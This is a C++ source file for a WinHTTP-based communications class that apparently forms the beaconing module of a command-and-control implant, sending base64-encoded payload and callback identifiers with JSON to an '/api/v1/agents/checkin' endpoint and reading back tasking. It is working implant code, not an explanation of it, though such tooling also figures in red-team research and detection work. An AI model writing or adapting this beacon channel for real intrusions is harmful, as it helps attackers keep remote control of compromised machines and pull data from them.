//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^{ BEGINNING OF FILE }^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
#include "CommManager.h"
#include "base64.hpp"
#include <iostream>
#include <thread>
#include <chrono>
#include <windows.h>
#include <winhttp.h>
#include <vector>
#pragma comment(lib, "winhttp.lib")

#define WIDE_PREFIX_HELPER(x) L##x
#define TO_WIDE_STRING(x) WIDE_PREFIX_HELPER(x)

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
// Default constructor 
CommManager::CommManager()
{
	const std::vector<std::wstring> hosts = { COMM_HOSTS_LIST };
	payloadUUID = COMM_PAYLOAD_UUID;
	host = L"localhost";
}

void CommManager::IntialCheckin(const std::string& json)
{
	HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
	DWORD dwSize = 0, dwDownloaded = 0, dwOptionalLength = 0;
	std::string strData;
	BOOL bResults = FALSE;
	LPSTR buffer = NULL;
	LPVOID lpOptional;

	hSession = WinHttpOpen(
		TO_WIDE_STRING(COMM_USER_AGENT),
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);
	if (!hSession) goto e_func;

	hConnect = WinHttpConnect(hSession, host.c_str(), COMM_PORT, 0);
	if (!hConnect) goto e_func;

	hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/v1/agents/checkin", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
	if (!hRequest) goto e_func;

	strData = base64::to_base64(payloadUUID + json);
	lpOptional = (LPVOID)strData.c_str();
	dwOptionalLength = (DWORD)strData.length();

	bResults = WinHttpSendRequest(
		hRequest,
		TO_WIDE_STRING("Content-Type: application/json"),
		(DWORD)-1L,
		lpOptional,
		dwOptionalLength,
		dwOptionalLength,
		0);
	if (!bResults) goto e_func;

	if (WinHttpReceiveResponse(hRequest, NULL))
	{
		std::vector<char> buffer;
		do {
			dwSize = 0;
			if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
			if (dwSize == 0) break;
			buffer = std::vector<char>(dwSize);
			if (!WinHttpReadData(hRequest, buffer.data(), dwSize, &dwDownloaded)) break;
		} while (dwSize > 0);

		if (!buffer.size() > 0) goto e_func;
		callbackUUID = base64::from_base64(std::string(buffer.begin(), buffer.end()));
	}

e_func:
	if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);
}

std::string CommManager::Checkin(const std::string& json)
{
	HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
	DWORD dwSize = 0, dwDownloaded = 0, dwOptionalLength = 0;
	std::string result, strData;
	BOOL bResults = FALSE;
	LPSTR buffer = NULL;
	LPVOID lpOptional;

	hSession = WinHttpOpen(
		TO_WIDE_STRING(COMM_USER_AGENT),
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);
	if (!hSession) goto e_func;

	hConnect = WinHttpConnect(hSession, host.c_str(), COMM_PORT, 0);
	if (!hConnect) goto e_func;

	hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/v1/agents/checkin", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
	if (!hRequest) goto e_func;

	strData = base64::to_base64(callbackUUID + json);
	lpOptional = (LPVOID)strData.c_str();
	dwOptionalLength = (DWORD)strData.length();

	bResults = WinHttpSendRequest(
		hRequest,
		TO_WIDE_STRING("Content-Type: application/json"),
		(DWORD)-1L,
		lpOptional,
		dwOptionalLength,
		dwOptionalLength,
		0);
	if (!bResults) goto e_func;

	if (WinHttpReceiveResponse(hRequest, NULL))
	{
		std::vector<char> buffer;
		do {
			dwSize = 0;
			if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
			if (dwSize == 0) break;
			buffer = std::vector<char>(dwSize);
			if (!WinHttpReadData(hRequest, buffer.data(), dwSize, &dwDownloaded)) break;
		} while (dwSize > 0);

		if (!buffer.size() > 0) goto e_func;
		result = base64::from_base64(std::string(buffer.begin(), buffer.end()));
	}

e_func:
	if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);

	return result;
}
//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^{ END OF FILE }^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//